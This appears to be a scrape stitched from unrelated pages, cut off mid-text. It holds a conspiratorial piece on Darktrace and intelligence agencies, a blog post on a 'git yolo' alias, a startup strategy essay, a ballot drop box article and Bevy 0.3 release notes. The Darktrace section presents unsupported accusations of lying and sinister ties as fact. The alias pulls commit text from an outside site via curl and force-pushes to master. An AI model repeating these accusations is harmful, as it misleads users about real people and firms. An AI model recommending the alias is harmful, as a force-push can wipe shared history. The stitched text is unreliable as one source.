wealthy patrons funding this cutting edge future tech are out in force, working to propel our societies into this new, unexplored and dystopian technological frontier.&nbsp;</p><p>But who are the companies that these eager wealthy venture capitalists are funding to create an autonomous, A.I.-powered cyber defence system like never before? Are they even companies at all when we consider their deep and direct ties to intelligence agencies? Should these firms instead be reclassified as simply extensions of state intelligence apparatus acting without the restrictions of public accountability?&nbsp;</p><p>Each of these companies have been built by teams of former intelligence operatives, some of who have sat in the highest echelons of the intelligence apparati of their respective countries. MI5 and C.I.A. both carry considerable weight in these sinister sounding enterprises, but it is Israel’s Unit 8200 that are the main group capitalising on this advance into the world-altering realm of unsupervised Artificial Intelligence algorithms.&nbsp;</p><p>Yet, these very companies appear to be selling a defence against a potential apocalypse that they themselves may be responsible for. They have the solutions to everyone’s cyber-woes, or at least that’s the image they wish to portray. Let me introduce you to the most dangerous intelligence operations masquerading as cybersecurity companies on planet Earth. &nbsp;</p><h2 id="darktrace-the-unsupervised-machine-learning-a-i-cybersecurity-solution"><strong>Darktrace – The Unsupervised Machine Learning A.I. Cybersecurity Solution</strong></h2><p>The members of Darktrace are open about their aims. They <a href="https://youtu.be/tiJjt4YNbf4?t=82">talk about publicly held data</a> as though they already have the rights to sell it to anyone around the world. Data is the fuel of the Fourth Industrial Revolution and Darktrace has made almost $2 billion in the data business during its relatively short history, reaching <a href="https://en.wikipedia.org/wiki/Unicorn_(finance)">Unicorn status</a> with great ease. When Darktrace first launched its website in 2013, its description of the company’s vision was entitled, “The New Normal: Learn Human and Machine Behavior to Reduce Cyber Security Risks.” Back then we were less familiar with the term “the new normal,” but now it surrounds us. Darktrace is already active within the NHS, the <a href="https://edition.cnn.com/2018/02/05/tech/darktrace-cybersecurity-immune-system/index.html">U.K. power grid</a>, and many other major parts of Britain’s critical infrastructure and they are rapidly expanding around the globe.</p><p>Dave Palmer was an MI5 anti-terror agent working on the 2012 London Olympics when he and some of his colleagues first bashed out the initial idea for what would become Darktrace. They wanted to create an A.I. cybersecurity system that was based on the human immune system, a system that differed from the traditional, reactive antivirus software approach. This system would look for abnormalities in a computer network’s processes to target a wider range of more sophisticated cyber issues.&nbsp;</p><p>Palmer had spent 14 years working for MI5 and GCHQ in a role creating secure networks for British spies to communicate. He would eventually approach two mathematicians from Cambridge University to help make his dreams reality at the tail end of 2012. These mathematicians were working on projects related to using unsupervised machine learning to teach a computer to have a sense of self, a step that would bring such technology dangerously close to the so-called <a href="https://www.digitaltrends.com/cool-tech/what-is-the-singularity-ai/">singularity</a>. At that point, as critics and proponents of self-aware A.I. alike have warned, that machine intelligence will not only surpass human intelligence, but advance at an incomprehensible rate, which major and world-altering implications.</p><p>In a <a href="https://www.youtube.com/watch?v=USHgnyIGAXI&amp;t=149s"><em>TechCrunch</em> talk in 2016</a>, the freshly installed co-CEO of Darktrace, <a href="https://www.linkedin.com/in/poppy-gustafsson-41464ba0/?originalSubdomain=uk">Poppy Gustafsson</a>, is caught misleading the audience about the company’s origins. She uses the <em>TechCrunch</em> stage to claim that the “spark” for the creation of Darktrace originally came from the mathematicians at Cambridge and downplayed the involvement of intelligence agencies like MI5, GCHQ, and the C.I.A. The <em>TechCrunch</em> moderator, Natasha Lomas, displayed some fine journalistic integrity on this occasion and asked for clarification. “So did the maths research come first and then you got together with the spies. Which way round was it?” asked the intrepid Lomas. Gustafsson squirms a little before saying, “it was exactly that. First the machine learning that was talking about how to critique a computer to help it understand itself. And then it was the, um, experts from the government intelligence agencies who thought ‘ooh, this could be applied to the problem of cybersecurity.’” But that statement was an outright lie and Gustafsson isn’t the most skilled deceiver.</p><p>Gustafsson, who was initially CFO and COO for the fledgling Darktrace, runs the company alongside the other co-CEO Nicole Eagen, an alumnus of Oracle, a major tech company that also has <a href="https://paleofuture.gizmodo.com/larry-ellisons-oracle-started-as-a-cia-project-1636592238">its origins in intelligence</a>. Both parts of Darktrace’s female power duo were brought over from <a href="https://www.invokecapital.com/">Invoke Capital</a> by Darktrace’s initial angel investor and <a href="https://www.darktrace.com/en/advisory-board/">advisory board</a> member, UK billionaire <a href="http://www.drmikelynch.crazybillionaire.org/drmikelynch.php">Dr. Mike Lynch OBE</a>. Describing himself as the <a href="https://www.theguardian.com/business/2019/dec/12/autonomy-founder-mike-lynch-accused-of-lying-in-trial">“UKs answer to Bill Gates“</a>, Dr. Mike Lynch is lauded as one of the most influential investors in the tech sector. His previous successful endeavours had been with Autonomy, a tech firm that has Lynch caught up in a legal wrangle with HP over the fraudulent inflation of its valuation, and Blinkx, a video search company where Lynch was later forced to step down from the board.&nbsp;</p><p>Dr. Mike Lynch’s problems with Hewlett Packard are not to be understated as was made clear in <a href="https://www.telegraph.co.uk/technology/2019/12/09/mike-lynch-prepares-us-extradition-battle-5bn-trial-century/amp/">a Telegraph article</a> that described it as “the trial of the century.” But, before that spectacle can take place, Mike Lynch must first be extradited and his protracted court battle to resist extradition has led to some uncertainty surrounding the future of Darktrace whilst Lynch is still active within the company. It was also <a href="https://news.sky.com/story/goldman-snubs-2bn-darktrace-float-amid-lynch-extradition-battle-12075941">recently reported</a> in the mainstream media that the Wall Street bank Goldman Sachs had declined to take a role in the initial public offering (IPO) of Darktrace due to Mike Lynch’s ongoing extradition battle. &nbsp;</p><p>Yet, Darktrace is not just one man working alone. The company boasts that over 4000 organisations worldwide now rely on Darktrace’s A.I. technologies. With headquarters in San Francisco, US, and Cambridge, UK, <a href="https://www.darktrace.com/en/">Darktrace has over 1300 employees</a> spread across 44 countries and their numbers are rising. And although the connections to the state intelligence agencies are clear and obvious, Darktrace is officially a completely private enterprise with big investors including KKR, Summit Partners, Vitruvian Partners, Samsung Ventures, TenEleven Ventures, Hoxton Ventures, Talis Capital, Invoke Capital and Insight Venture Partners. Sitting alongside the controversial Dr. Mike Lynch OBE on the advisory board for Darktrace are some seriously influential people deeply connected to US and UK intelligence agencies.&nbsp;</p><p>One of the first members appointed to Darktrace’s advisory board was <a href="https://en.wikipedia.org/wiki/Jonathan_Evans,_Baron_Evans_of_Weardale">Jonathan Evans</a>, also referred to as Baron Evans of Weardale. Evans was previously the Director General of MI5, taking over from Dame Eliza Manningham-Buller in 2007 and staying in the most senior intelligence role that the UK has to offer until 2013. After his time as head of MI5, Evans initially joined HSBC Holdings as a non-executive Director, a role he also took up at Ark, a highly secure UK data centre.&nbsp;</p><p>If you were to walk into the advisory boardroom at Darktrace, you could be forgiven for thinking that you were actually attending a U.K. Home Office meeting from the past. The former Home Secretary under Prime Minister Theresa May, Amber Rudd, <a href="https://www.darktrace.com/en/press/2020/326/">became part of Darktrace</a> after her time in government ended in 2019. She is also on the advisory team of Teneo, a consulting firm co-founded and led by <a href="https://www.teneo.com/person/doug-band/">Doug Band</a>, the former advisor to Bill Clinton and close friend of the infamous Jeffrey Epstein. As always, when investigating the murky world of intelligence, many connections to Epstein and his partner Ghislaine Maxwell are revealed. &nbsp;</p><p>With that being said, yet another member of Darktrace’s advisory board also has Epstein/Maxwell links. The C.I.A. stalwart, Alan …</p></div></div>

        <p>Git yolo has changed my life for the better. It saves me tons of time. You never have to type in a commit comment again.</p>
<p>Here is how to get the yolo alias working:</p>
<p>You need to edit your gitconfig dotfile that is located at <code>~/.gitconfig</code>.</p>
<p>Mine before:</p>
<pre><code>$ cat ~/.gitconfig
# This is Git's per-user configuration file.
[user]
# Please adapt and uncomment the following lines:
	name = jamesacampbell
	email = james@jamescampbell.us
[url "git@gitlab.com:"]
		insteadOf = https://gitlab.com/
</code></pre><p>Mine after:</p>
<pre><code>$ cat ~/.gitconfig
# This is Git's per-user configuration file.
[user]
# Please adapt and uncomment the following lines:
	name = jamesacampbell
	email = james@jamescampbell.us
[url "git@gitlab.com:"]
		insteadOf = https://gitlab.com/
[alias]
yolo = !git add -A &amp;&amp; git commit -am \"`curl -s http://whatthecommit.com/index.txt `\" &amp;&amp; git push -f origin master
</code></pre><p>This has saved me <em>hours</em> over the past year. It uses random text snippets from <a href="http://whatthecommit.com/">http://whatthecommit.com</a> for your commit statements. So be prepared to have some silly commit statements.</p>
<p>Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When you start playing a new game, an expert can easily predict the mistakes you're about to make. It's easy for the expert to do because anyone who doesn't yet have an intuition for the game will make the same class of novice mistakes.</p><p>For example, in chess novices make blunders because they miss something trivial on the board. They'll often recognize the blunder immediately, even before their opponent makes the next move. In the game of Go novices attack stones by attaching to them even though attaching to an opponent's stone makes it stronger. And in business novices make a product nobody wants.</p><p>You can't transmit product intuition verbally any more than you can do that for chess. Improvement happens over time with considerable trial, error and repeated feedback. Still, some explanations are better than others, and all currently available explanations aren't good enough. We know that because perfectly smart, capable people will read everything available on the subject and still make products no one wants. Let's try to do better.</p><p>Imagine two startups-- A and B. Startup A has a great product and list of potential users that's longer than they know what to do with. They've hired an army of sales people and still barely scratched the surface of the list. Almost any time a salesperson calls up a potential user, the person on the other end is interested. They get what the product is about quickly. A third of the calls result in a second call, and almost all of those result in a sale. Users love the product. The office is vibrant and the energy is palpable. The company grows quickly. Life is good.</p><p>Startup B has a great product and technology that's years ahead. They have a list of potential users too-- from inbound emails, social media conversations, investor introductions, and their personal network. They can't quite tell if the product is a good fit for people on the list, but they have hunches. When they call, it's difficult to explain the product-- it takes a while for people to get it. Those who get it aren't quite sure if the product is for them. They ask about a few features. Maybe there is more back and forth. Ultimately, few people buy. In an attempt to get users, startup B builds features that pull it in different directions. After years of trying it runs out of money and shuts down.</p><h3>Go-to-market</h3><p>What's the difference between the two startups? Startup A has what the industry calls a well executed go to market strategy. Roughly, a go-to-market strategy is the answer to the question "how will you sell what you've made?" Roughly, but not quite. If you build the product and then try to answer this question, you'll find that it's nearly impossible. No matter how hard you try, the product doesn't sell. You become startup B. That's because there is a nuance in the question. The definition is almost correct but not quite. This one nuance probably killed more startups than almost anything else.</p><p>The problem is that the question implies sequential steps. First you make a product, then you figure out how to sell it. That's <strong>wrong</strong>. The product and the go to market strategy intricately depend on each other, the way two species may depend on each other in an ecology. Without one, there is no other. They must co-evolve together.</p><p>You might say "well, what about Facebook and Google? They didn't figure out how to make money until long after they've launched!" Fair enough. Replace "sell" with "get users". How will you get users for what you've made? That's still the wrong question. The making and the getting are one process-- they must co-evolve together.</p><p>There is an unpleasant corollary here. You can't apply this essay to an existing product that isn't selling. You can try and you may be able to salvage it, but you'll need to throw large pieces of your product out. You might need to throw all of it out. It's a difficult thing to hear, but that's what you've signed up for when you started a company.</p><h3>Partition functions</h3><p>At the heart of a go-to-market strategy is a user partition function. It works like this. Imagine you have a set <code>S</code> with every person on the planet as its member. A partition function <code>user?</code> takes members of this set as input and outputs a binary value-- <code>true</code> if the person is a target user of your product, <code>false</code> otherwise. Another way to think about it is that <code>user?</code> partitions the set <code>S</code> into two-- a set of target users <code>U</code> and a set of everyone else <code>E</code>. For example your company, Linen Candy Corp., is building a new product for everyone who likes cotton candy. In that case your user partition function looks like this:</p><pre><code>fn user?(person) {</code></pre><pre><code>  return person.likes_cotton_candy == true;</code></pre><pre><code>}</code></pre><p>This is easy enough. But there is more. The function <strong>must</strong> have two additional properties.</p><p>First, it must be precise. It doesn't have to be a computer program, though that wouldn't hurt. It could be specified in pseudo-code or in natural language. But if I point you to a person and give you the necessary information about them, you must be able to instantly tell whether they're a target user or not. No fuzziness. No maybe. No confusion. You must have complete and immediate certainty. Either <code>true</code> or <code>false</code>.</p><p>Second, the range of the function must be efficiently computable, and it must be efficiently computable by you. Imagine that your product is immensely successful. So successful that anyone in the set of target users <code>U</code> who gets a cold email immediately buys it. Will you be able to efficiently generate a list of cotton candy lovers and their emails?</p><p>One way to think about it is that all functions that can be expressed using <a href="https://developers.facebook.com/docs/marketing-api/audiences/reference/advanced-targeting/">Facebook's ad targeting API</a> are valid user partition functions because they satisfy both criteria. They're specific; and you can reach everyone in <code>U</code> by paying Facebook.</p><p>Not all valid user partition functions can be expressed using Facebook's API. For example your product may be targeting everyone who's first name is Bill. That's not something Facebook ad targeting can do but you can find these users in a phone book. Or at least you could have back when we still had phone books.</p><p>To go back to the two startups, the concrete advantage of startup A is that it has a good user partition function. The target users understand and buy the product quickly because it was built just for them. The product solves their problems, and deliberately doesn't solve anyone else's. There is no confusion. The partition function unifies sales, marketing, and engineering. And it pulls everyone's work in exactly the same direction.</p><h3>Scoring</h3><p>Of course a function that splits users into two sets, is precise and is efficiently computable is a partition function, but that doesn't mean it's a good partition function. Most partition functions are bad, and a bad partition function won't give you startup A-- it will give you a more focused startup B that fails quicker. That's valuable in itself, but not good enough. So we need a way to measure the quality of partition functions.</p><p>Let's define a higher order function <code>score</code>, which takes a partition function as an argument and returns and returns a number between <code>0</code> and <code>1</code>. The score of zero means you won't sell anything. The score of one is the impossible platonic ideal-- it means you'll sell to every potential user you encounter. The higher the score, the closer you are to building the coveted startup A. Most partition functions have scores that hover around zero.</p><p>Here is one implementation of <code>score</code> that's very simple. First, make a demo of the product as quickly as possible. The demo isn't the actual product, and it doesn't need to be a prototype. You can make it a Figma design or even a slide deck. All it has to do is communicate the problem and how your product solves it.</p><p>Then take a sample of potential users generated by your user partition function. About thirty would do. Call them all and try to get them to pay you. After a week, divide the number of potential users that sent you money over the sample size. That's your score. If you couldn't get anyone to pay you, the score is <code>0 / 30 = 0</code>. If twenty people paid it's <code>20 / 30 = 0.66</code>. If everyone paid it's <code>30 / 30 = 1</code>.</p><p>There are many reasons this specific implementation may not work for what you're doing. You can tweak the sample size, the sales cycle length, or change the desired outcome from money in the bank to some other action or metric. Letters of intent, number of minutes spent per week on your site over a certain threshold, some minimum number of friends invited to the platform. You can adapt <code>score</code> to any business, but be sure the outcome is meaningful! Money in the bank is best. There isn't a second best, but for complex business models a specialized metric can work too.</p><h3>Focus</h3><p>Think of early startup work in two stages. The first stage is generating many <code>(partition_function, demo)</code> pairs and scoring them. Once you find a pair with a good score you enter the second stage. In the second stage you abandon everything else and completely focus on the <strong>one</strong> high scoring pair.</p><p>If you run into a potential customer who isn't in the current partition list, you don't work with them. If there is a feature that doesn't benefit users on the current partition list, you don't build it. When you design a landing page, you write only for the potential users on your list. They need to land on the page and answer the question "is this for me?" in one second, and then reaffirm the answer with every additional sentence. Discard anything that doesn't accomplish this goal, no matter how appealing it sounds.</p><p>What's a good score? It depends on your business. Here is one way to think about it: suppose a demo takes forty minutes, and between all the other work a sales rep (who early on is probably you) can only do five of these per day. A score of 0.2 means the rep will close one customer per day. A score of 0.1 means the rep will close one customer every two days. A score of 0.05 means the rep will close one customer in a week, give or take.</p><p>How do the economics work out? Does the product cost $500 or …</p></div></div>

<p>A few years ago, students emerged from a field trip at the elections office in <a href="https://www.kingcounty.gov/depts/elections/about-us/security-and-accountability/watch-us-in-action.aspx" target="_blank">King County, Washington</a> to an unexpected scene: their school bus had collided with a ballot drop box in the parking lot.</p><p>The drop box was fine. The bus, not so much.</p><p>“It’s a story we tell a lot,” said Halei Watkins, a spokeswoman for the agency. “A school bus tried to take out one of our drop boxes, and the box came away without a scratch.”</p><figure><img alt="" height="4032" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/11/02/20201012_172726459_iOS.jpg" width="3024">
<figcaption>The inside of a ballot drop box in King County, Washington. (Courtesy of King County)</figcaption>
</figure><p>The boxes are heavy duty by design, made of steel and built to withstand <a href="https://www.theolympian.com/news/local/article233542407.html" target="_blank">car crashes</a>, fires and deluges of wind and rain. That’s largely thanks to the input of election officials from Pierce County, Washington, who helped design the receptacles a decade ago, when the state began transitioning its elections primarily to <a href="https://www.sos.wa.gov/_assets/elections/wa_vbm.pdf" target="_blank">mail-in voting</a>.&nbsp;</p><p>In 2010, workers from the county <a href="https://www.co.pierce.wa.us/93/Auditor" target="_blank">auditor’s office</a> contacted <a href="https://laserfabusa.com/" target="_blank">Laserfab, Inc.</a>, a local metal fabrication company, to see if they’d be willing to manufacture a drop box that was sturdier and more secure than a typical mailbox, said Larry Olson, the company’s vice president.</p><p>“They were very interested that it be done locally,” he said. “They came to us and asked if we would be interested in doing it, and we worked with them on the initial designs.”</p><p>A decade later, Laserfab, Inc. remains one of just a handful of vendors that manufactures ballot boxes for local governments (others include <a href="https://www.fortknoxmailbox.com/ballot-boxes/" target="_blank">Fort Knox</a> and <a href="https://www.recyclingbin.com/Categories/Military-Government-Municipality-Recycling-Bins-Trash-Cans-46/Outdoor-Steel-Voter-Ballot-Drop-Box" target="_blank">Recyclingbin.com</a>). Today, the company’s steel boxes—manufactured under the brand name <a href="https://votearmor.laserfabusa.com/" target="_blank">Vote Armor</a>—weigh roughly 1,000 pounds and are bolted into cement with 8-inch steel bolts. They cost around $7,000 apiece, and while they have no specific stated lifespan, boxes that have been in the field since 2011 are still fully functional, Olson said.&nbsp;</p><p>After debuting in Pierce County a decade ago, the boxes spread through the Pacific Northwest—first to other counties in Washington, then to Oregon, then on to California and Colorado. As of Monday, there were more than 700 in the field, installed in 64 counties across 13 states. More than 200 of those were ordered this year, as states prepared for an <a href="https://www.usatoday.com/story/news/politics/elections/2020/10/06/election-2020-fueled-democrats-early-voting-way-up/3623292001/" target="_blank">unprecedented influx</a> of mail-in ballots during the ongoing Covid-19 pandemic, Olson said.</p><p>“Almost a third of everything we’ve done in 10 years, we’ve done in the last five or six months,” he said. “We have three small plants, with anywhere from 15 to 25 people, and we had two of them working on our boxes. With all of the Covid stuff going on, we started hearing things in March, but I think people were waiting for government funding to come through before placing orders. We didn’t start going really heavy until about June, and from June through the first or second week of October, we were just kind of nonstop.”</p><figure><img alt="" height="720" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/11/02/Pierce%20Co%20WA%205038%20(1).jpg" width="960">

</figure><p>The company’s basic box design includes multiple built-in security features to address concerns about the security of mail-in voting, Olson said. The ballot slot, for example, is just big enough to fit one or two envelopes, and connects to a “snorkel,” an angled chute that makes it difficult for liquids—including rain—to get in. The doors require keys to open and are manufactured at an angle, so they won’t close at all unless they’re properly locked, making it impossible for election workers to shut the box without correctly securing the locking mechanism.</p><p>“What I tell people is, these county election officials—this is their passion,” Olson said. “Every design feature of the boxes, from the very beginning, was designed in response to the question of, ‘How does this affect or enhance the integrity of the voting process?’ And that includes things that you may never think of. We’ve taken every step that’s come up to minimize the opportunities for tampering.”</p><p>Some counties—up to a third of Laserfab, Inc.’s customers, Olson said—opt to install extra security features, often required by state or local law. King County, for example, places a powder fire retardant inside the drop-off slot, which would deploy if someone took a match to their ballot before pushing it into the box (“We obviously didn’t go with water for that,” Watkins said).</p><p>In Denver, election workers tested the boxes by tossing a lit match through the ballot slot; there wasn’t enough air inside for the flame to do any damage, said Amber McReynolds, CEO of the <a href="https://voteathome.org/" target="_blank">National Vote at Home Institute</a> and Denver’s former elections director.</p><p>“The vendor had told us about all of these features, but we tested them all in-house,” said McReynolds, who helped set up Colorado's vote-by-mail system. “We never had anyone try to set anything on fire. We never had anyone try to dump water inside. We did have someone mark a box with spray paint, but that was the only thing that ever happened, in terms of tampering, that I’m aware of in Colorado, and they now have more than 300 boxes in the state.”</p><figure><img alt="" height="4000" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/11/02/AP_20289672994330.jpg" width="6000">

</figure><p>Still, some vandals have had success breaching drop-off boxes. As many as 100 ballots were damaged when a ballot box in Baldwin Park, California was <a href="https://www.washingtonpost.com/nation/2020/10/20/california-ballot-box-arson/" target="_blank">set on fire</a> last month, and around three dozen ballots were ruined in a similar fire in <a href="https://www.washingtonpost.com/nation/2020/10/26/boston-ballot-dropbox-arson-election/" target="_blank">Boston</a> a week later. The California box was ruined, but Boston’s remained intact, open for ballot drops and under 24-hour surveillance,, according to the <a href="https://twitter.com/BostonElections/status/1320463408416907265" target="_blank">Boston Election Department</a>. (It's unclear who manufactured either box.)</p><p>Things have been comparatively quiet in King County, Watkins said—with one exception on the first weekend the ballot boxes opened for drop-off.</p><p>“We had someone attempt to shove a piece of cardboard with feces of some kind through the slot,” she said. “Again, that slot is specifically designed to fit just a ballot or two, so nothing got into the dropbox—but there was a bit of a mess for our staff to clean up.”<svg>

  </div><div><p>A little over a month after releasing Bevy 0.2, and thanks to <strong>59</strong> contributors, <strong>122</strong> pull requests, and our <a href="https://github.com/sponsors/cart"><strong>generous sponsors</strong></a>, I'm happy to announce the <strong>Bevy 0.3</strong> release on <a href="https://crates.io/crates/bevy">crates.io</a>!</p>
<p>For those who don't know, Bevy is a refreshingly simple data-driven game engine built in Rust. You can check out <a href="https://bevyengine.org/learn/book/getting-started/">Quick Start Guide</a> to get started. Bevy is also free and open source forever! You can grab the full <a href="https://github.com/bevyengine/bevy">source code</a> on GitHub.</p>
<p>Here are some of the highlights from this release:</p>
<h2 id="initial-android-support">Initial Android Support</h2>

<p>You can try out the <a href="https://github.com/bevyengine/bevy/tree/master/examples/android">Bevy Android example</a> by following the <a href="https://github.com/bevyengine/bevy/blob/master/examples/README.md#android">instructions here</a>. While many things work, please note that this is <em>very hot</em> off the presses. Some features will work and others probably won't. Now is a great time to dive in and help us close the gaps!</p>
<p><img src="https://bevyengine.org/news/bevy-0-3/android.png" alt="android"></p>

</ul>
<h2 id="wasm-asset-loading">WASM Asset Loading</h2>
<p>authors: @mrk-its (and ported to the new AssetIo by @cart)</p>
<p>@mrk-its has been hard at work on expanding Bevy's WASM support. In this release we landed WASM asset loading. You can now load assets when you publish to WASM just like you would on any other platform:</p>
<pre><code><span>asset_server</span><span>.</span><span>load</span><span>("</span><span>sprite.png</span><span>");
</span></code></pre>
<p>If the asset hasn't already been loaded, this will make a <code>fetch()</code> request to retrieve the asset over HTTP.</p>
<p>@mrk-its has also been building a custom WebGL2 <code>bevy_render</code> backend. It is already pretty usable, but its not <em>quite</em> ready yet. Expect more news on this soon!</p>
<h2 id="touch-input">Touch Input</h2>
<p>authors: @naithar</p>
<p>Bevy now has support for touches:</p>
<pre><code><span>fn </span><span>touch_system</span><span>(</span><span>touches</span><span>: </span><span>Res</span><span>&lt;</span><span>Touches</span><span>&gt;) {
    </span><span>// you can iterate all current touches and retrieve their state like this:
    </span><span>for</span><span> touch </span><span>in</span><span> touches</span><span>.</span><span>iter</span><span>() {
        </span><span>println!</span><span>("</span><span>active touch: {:?}</span><span>",</span><span> touch</span><span>);
    }

    </span><span>for</span><span> touch </span><span>in</span><span> touches</span><span>.</span><span>iter_just_pressed</span><span>() {
        </span><span>println!</span><span>("</span><span>just pressed {:?}</span><span>",</span><span> touch</span><span>);
    }

    </span><span>for</span><span> touch </span><span>in</span><span> touches</span><span>.</span><span>iter_just_released</span><span>() {
        </span><span>println!</span><span>("</span><span>just released {:?}</span><span>",</span><span> touch</span><span>);
    }

    </span><span>for</span><span> touch </span><span>in</span><span> touches</span><span>.</span><span>iter_just_cancelled</span><span>() {
        </span><span>println!</span><span>("</span><span>just cancelled {:?}</span><span>",</span><span> touch</span><span>);
    }
}
</span></code></pre>
<p>You can also consume raw touch events using the <code>Events&lt;TouchInput&gt;</code> resource.</p>
<h2 id="asset-system-improvements">Asset System Improvements</h2>
<p>authors: @cart</p>
<h3 id="asset-handle-reference-counting">Asset Handle Reference Counting</h3>
<p>Assets are now automatically freed when their "handle reference count" reaches zero. This means you no longer need to think about freeing assets manually:</p>
<pre><code><span>// Calling load() now returns a strong handle:
</span><span>let</span><span> handle </span><span>=</span><span> asset_server</span><span>.</span><span>load</span><span>("</span><span>sprite.png</span><span>");

</span><span>// Note that you no longer need to unwrap() loaded handles. Ergonomics for the win!

// Cloning a handle increases the reference count by one
</span><span>let</span><span> second_handle </span><span>=</span><span> handle</span><span>.</span><span>clone</span><span>();

</span><span>// Spawn a sprite and give it our handle
</span><span>commands</span><span>.</span><span>spawn</span><span>(</span><span>SpriteComponents </span><span>{
</span><span>    material</span><span>:</span><span> materials</span><span>.</span><span>add</span><span>(</span><span>handle</span><span>.</span><span>into</span><span>()),
    ..</span><span>Default</span><span>::</span><span>default</span><span>()
});

</span><span>// Later in some other system:
</span><span>commands</span><span>.</span><span>despawn</span><span>(</span><span>sprite_entity</span><span>);

</span><span>// There are no more active handles to "sprite.png", so it will be freed before the next update
</span></code></pre><h3 id="asset-loaders-can-now-load-multiple-assets">Asset Loaders can now load multiple assets</h3>
<p>In past releases, <code>AssetLoaders</code> could only produce a single asset of a single type. In <strong>Bevy 0.3</strong>, they can now produce any number of assets for any type. The old behavior was extremely limiting when loading assets like GLTF files, which might produce many meshes, textures, and scenes. </p>
<h3 id="sub-asset-loading">Sub-Asset Loading</h3>
<p>Sometimes you only want to load a specific asset from an asset source. You can now load sub assets like this:</p>
<pre><code><span>// Mesh0/Primitive0 references the first mesh primitive in "my_scene.gltf"
</span><span>let</span><span> mesh </span><span>=</span><span> asset_server</span><span>.</span><span>load</span><span>("</span><span>my_scene.gltf#Mesh0/Primitive0</span><span>");
</span></code></pre><h3 id="assetio-trait">AssetIo Trait</h3>
<p>The <code>AssetServer</code> is now backed by the <code>AssetIo</code> trait. This allows us to load assets from whatever storage we want. This means on desktop we now load from the filesystem, on Android we use the Android Asset Manager, and on the web we make HTTP requests using the <code>fetch()</code> api.</p>
<h3 id="asset-dependencies">Asset Dependencies</h3>
<p>Assets can now depend on other assets, which will automatically be loaded when the original asset is loaded. This is useful when loading something like a "scene" which might reference other asset sources. We utilize this in our new GLTF loader.</p>
<h3 id="removed-assetserver-load-sync">Removed AssetServer::load_sync()</h3>
<p>This might rustle some feathers, but <code>AssetServer::load_sync()</code> had to go! This api wasn't WASM friendly, encouraged users to block game execution for the sake of convenience (which causes "hitching"), and was incompatible with the new AssetLoader api. Asset loading is now always asynchronous. Users of <code>load_sync()</code> should instead <code>load()</code> their assets, check load status in their systems, and change game state accordingly. </p>
<h2 id="gltf-scene-loader">GLTF Scene Loader</h2>
<p>authors: @cart</p>
<p>Up until this point, the GLTF loader was painfully limited. It could only load the first mesh with a single texture in a GLTF file. For <strong>Bevy 0.3</strong>, we took advantage of the asset system improvements to write a new <code>GltfLoader</code> that loads GLTF files as Bevy <code>Scenes</code>, along with all meshes and textures in the files.</p>
<p>Here's Bevy loading the Khronos Flight Helmet example, which consists of multiple meshes and textures!</p>
<p><img src="https://bevyengine.org/news/bevy-0-3/flight_helmet.png" alt="flight helmet"></p>
<p>Here is the complete code for a system that loads a GLTF file and spawns it as a scene:</p>
<pre><code><span>fn </span><span>load_gltf_system</span><span>(</span><span>mut </span><span>commands</span><span>:</span><span> Commands, </span><span>asset_server</span><span>: </span><span>Res</span><span>&lt;</span><span>AssetServer</span><span>&gt;) {
    </span><span>let</span><span> scene_handle </span><span>=</span><span> asset_server</span><span>.</span><span>load</span><span>("</span><span>models/FlightHelmet/FlightHelmet.gltf</span><span>");
</span><span>    commands</span><span>.</span><span>spawn_scene</span><span>(</span><span>scene_handle</span><span>);
}
</span></code></pre><h2 id="bevy-ecs-improvements">Bevy ECS Improvements</h2>
<p>authors: @cart</p>
<h3 id="query-ergonomics">Query Ergonomics</h3>
<p>In this release I finally was able to remove the one thing I <em>truly despised</em> in Bevy ECS. In previous versions of Bevy, iterating over the components in a <code>Query</code> looked like this:</p>
<pre><code><span>for </span><span>(</span><span>a</span><span>,</span><span> b</span><span>) in &amp;</span><span>mut</span><span> query</span><span>.</span><span>iter</span><span>() {
    </span><span>// The `&amp;mut` here just felt so unnatural
</span><span>}

</span><span>// Or if you preferred you could do this
</span><span>for </span><span>(</span><span>a</span><span>,</span><span> b</span><span>) in</span><span> query</span><span>.</span><span>iter</span><span>().</span><span>iter</span><span>() {
    </span><span>// query.iter().iter()? Really???
</span><span>}
</span></code></pre>
<p>Similarly, retrieving a specific entity's component's looked like this:</p>
<pre><code><span>if let </span><span>Ok</span><span>(</span><span>mut</span><span> result</span><span>) =</span><span> query</span><span>.</span><span>entity</span><span>(</span><span>entity</span><span>) {
    </span><span>if let </span><span>Some</span><span>((</span><span>a</span><span>,</span><span> b</span><span>)) =</span><span> result</span><span>.</span><span>get</span><span>() {
        </span><span>// access components here
    </span><span>}
}
</span></code></pre>
<p>In <strong>Bevy 0.3</strong> you can just do this:</p>
<pre><code><span>// iteration
</span><span>for </span><span>(</span><span>a</span><span>,</span><span> b</span><span>) in</span><span> query</span><span>.</span><span>iter</span><span>() {
    </span><span>// sweet ergonomic bliss
</span><span>}

</span><span>// entity lookup
</span><span>if let </span><span>Ok</span><span>((</span><span>a</span><span>,</span><span>b</span><span>)) =</span><span> query</span><span>.</span><span>get</span><span>(</span><span>entity</span><span>) {
    </span><span>// boilerplate be gone!
</span><span>}
</span></code></pre>
<p>You might naturally be thinking something like:</p>
<p><em>Why did this take so long? Why would removing a single <code>&amp;mut</code> be hard?</em></p>
<p>It's a long story! In summary:</p>
<ul>
<li>The old api looked the way it did for a reason. It was the result of good design choices that protect against unsafe memory access in a parallel environment.</li>
<li><code>query.iter()</code> didn't actually return an iterator. It returned a <em>wrapper</em> that held an atomic lock on the component storages. The same was true for the type returned by <code>query.entity()</code></li>
<li>Removing these "wrapper types" would have allowed unsafe behavior because another Query could access the same components in a way that violated Rust's mutability rules.</li>
<li>Due to the iterator implementation and quirks in the rust compiler, removing the wrapper type <em>tanked</em> iteration performance by about ~2-3x.</li>
</ul>
<p>Fortunately we finally found ways to solve all of these problems. The newly added <code>QuerySets</code> allow us to completely remove the locks (and wrapper types). And by completely rewriting <code>QueryIter</code> we were able to avoid the performance hit that removing the wrapper incurred. Read on for the details!</p>
<h3 id="100-lockless-parallel-ecs">100% Lockless Parallel ECS</h3>
<p>Bevy ECS is now completely lock free. In Bevy 0.2, we made direct <code>World</code> access and "for-each" systems lock free. This is possible because the Bevy ECS scheduler ensures that systems only run in parallel in ways that respect Rust's mutability rules. </p>
<p>We couldn't remove locks from <code>Query</code> systems because of systems like this:</p>
